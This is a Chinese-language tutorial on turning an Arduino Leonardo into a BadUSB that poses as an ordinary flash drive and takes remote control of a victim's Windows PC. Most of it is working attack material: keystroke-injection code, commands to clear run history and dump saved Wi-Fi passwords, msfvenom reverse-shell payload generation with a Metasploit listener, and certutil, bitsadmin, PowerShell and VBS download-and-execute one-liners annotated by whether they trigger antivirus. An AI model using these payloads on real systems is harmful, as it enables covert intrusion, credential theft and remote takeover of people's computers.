# 利用BadUSB远程控制

BadUSB是利用了USB协议上的漏洞，通过更改USB的内部固件，在正常的USB接口接入后，模拟外置鼠标、键盘的功能，以此来使目标主机执行已经精心构造好的命令。在此过程中不会引起杀毒软件、防火墙的一丝怀疑。而且因为是在固件级别的应用，U盘格式化根本无法阻止其内部代码的执行。

同样因为是对USB的利用，Windows、Linux、MAC等各类操作系统不必联网下载专用的驱动程序。此外，向BadUSB烧录的程序极为简单，大部分是对键盘按键进行模拟，上手较为容易。

BadUSB也是社会工程学的一个典型示例，它极大地利用了人们的好奇心，在路边捡到的USB，估计九成以上的人们都想看看里面有什么东西，而当你插入U盘，攻击就很难再停止下来了。

## 几种常的BadUSB

通常情况下都会把badusb制作成与U盘极其相似，且不会被受害者所察觉，badusb目前在淘宝有售，能够制作BadUSB的几种常见载体有：leonardo_Arduino、Phison、Teensy、Attiny85、PS2303（芯片）、Rubber_Ducky等，这里笔者都有试过，从外观形状和制作成功率来看，使用leonardo_Arduino制作BadUSB的效果最好，使用起来也较为方便。

## 烧录

- 安装Arduino IDE

arduino ide是一款专业的arduino开发工具，主要用于arduino程序的编写和开发，拥有开放源代码的电路图设计、支持ISP在线烧，同时支持Flash、Max/Msp、VVVV、PD、C、Processing等多种程序兼容的特点，在官网下载Arduino IDE，下载好后进行安装，将badusb连接主机，配置环境

- 获取开发板信息，确定是否连接

工具 -> 取得开发板信息 -> 有弹出说明已链接

- 设置开发板

1. 工具 -> 开发板 -> 开发板管理器 -> 选择Arduino AVR Boards板子，联网安装
2. 回到主界面，工具 -> 开发板 -> -> Arduino Leonardo
3. 回到主界面，工具 -> 端口 -> 选择合适的端口
4. 回到主界面，工具 -> 编程器 -> 选择:AVRISP mkII/USBasp（开他俩都可以，mac上用USBasp?）
5. 编写代码
6. 验证代码（对号）
7. 上传（右箭头）

- 编写代码

代码的编写我们可以借助Automator_2.0.1这款辅助软件，编写代码更加方便，软件：<https://github.com/Catboy96/Automator>

代码格式介绍：

```z
setup() 函数
用来初始化变量、Pin模式、开始使用库等
每次打开或重置Arduino板后，setup（）函数将只运行一次

loop() 函数
精确地执行其名称所建议的操作，并连续循环，从而允许程序更改和响应

#include<Keyboard.h>    //包含键盘模块的头文件
void setup();           //初始化
Keyboard.begin();       //开启键盘通信
delay(1000);            //延时1000毫秒
Keyboard.press();       //按下某个键
Keyboard.release();     //释放某个键
Keyboard.println();     //输入某些内容
Keyboard.end();         //结束键盘通信
Keyboard.press(KEY_RETURN);  //按下回车键
Keyboard.release(KEY_RETURN); //释放回车键

# 开启管理员级别的powershell
Keyboard.println("powershell.exe -command start-process powershell -verb runAs");  
# 清除运行窗口产生的记录
Keyboard.println("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f");
# 让cmd窗口变成一个很小的窗口
Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");
//删除桌面进程(all)
Keyboard.println("taskkill /f /im explorer.exe");

获取win连接过的所有wifi密码：
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
获取当前的wifi名：
netsh wlan show profiles
当前的wifi的密码：
netsh wlan show profile name="wifi名" key=clear
```

当写完代码后，首先点击第一个按钮进行验证，当显示编译完成则可点击上传进行烧录

模板：

```msf
#include<Keyboard.h> //包含键盘模块头文件

void setup() {
  // 运行一次的代码:
  Keyboard.begin();//开始键盘通信
  delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);//按下win键
  delay(500);
  Keyboard.press('r');//按下r键
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);//松掉win键
  Keyboard.release('r');//松掉r键
  delay(500);
  Keyboard.println("cmd");//输入cmd进入DOS
  delay(500);
  Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键
  delay(500);
Keyboard.println("这里换成你要用的代码");
delay(500);
  Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键
  delay(500);
  Keyboard.println("exit");//关闭cmd窗口
  delay(500);
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键
  delay(500);
  Keyboard.end();//结束键盘通讯
}

void loop() {
  // 重复运行代码
}
```

## 利用msf生成windows端木马

在msf中输入以下命令生成木马

```msf
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.22.147 lport=4444  -f elf -o shell       # linux
msfvenom -p  windows/meterpreter/reverse_tcp lhost=192.168.22.147 lport=4444  -f exe -o  shell.exe   # win
```

启动Apache2，将生成的木马复制到/var/www/html中

```msf
service apache2 start
sudo cp 木马名 /var/www/html
```

进入监听模式

```msf
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 你的ip
set LPORT 你监听的端口
run
```

## win下载命令

```cmd
certutil命令下载，有报毒提示：
certutil -urlcache -split -f https://www.xxx.com/test.py ff.py

bitsadmin命令下载，有报毒提示：
bitsadmin /transfer n http://www.xxx.com/setup.exe d:\2.exe

powershell命令下载,无提示
powershell (new-object System.Net.WebClient).DownloadFile( 'http://www.xxx.com/setup.exe','d:\3.exe')
powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://fake-blog.com/1meiyongde/setup.exe','d:\11.exe')

vbs下载，无报毒，俩个命令，先生成vbs文件，在下载
echo set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open "get",wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> ff.vbs
cscript ff.vbs http://www.xxx.com/setup.exe d:\1.exe

或者：
echo On Error Resume Next:Dim iRemote,iLocal:iLocal = LCase(WScript.Arguments(1)):iRemote = LCase(WScript.Arguments(0)):Set xPost = createObject("Microsoft.XMLHTTP"):xPost.Open "GET",iRemote,0:xPost.Send():Set sGet = createObject("ADODB.Stream"):sGet.Mode = 3:sGet.Type = 1:sGet.Open():sGet.Write(xPost.responseBody):sGet.SaveToFile iLocal,2 >> ss.vbs
cscript ss.vbs http://www.xxx.com/setup.exe d:\2.exe

win7 cmd 远程文件下载
certutil -urlcache -split -f http://192.168.3.211:8000/1.txt 11.txt

powershell 下载文件 win10测试成功
cmd 下进入powershell的方法 直接输入 powershell
$client = new-object System.Net.WebClient
$client.DownloadFile('http://192.168.3.211:8000/1.txt','D:\22.txt')
```
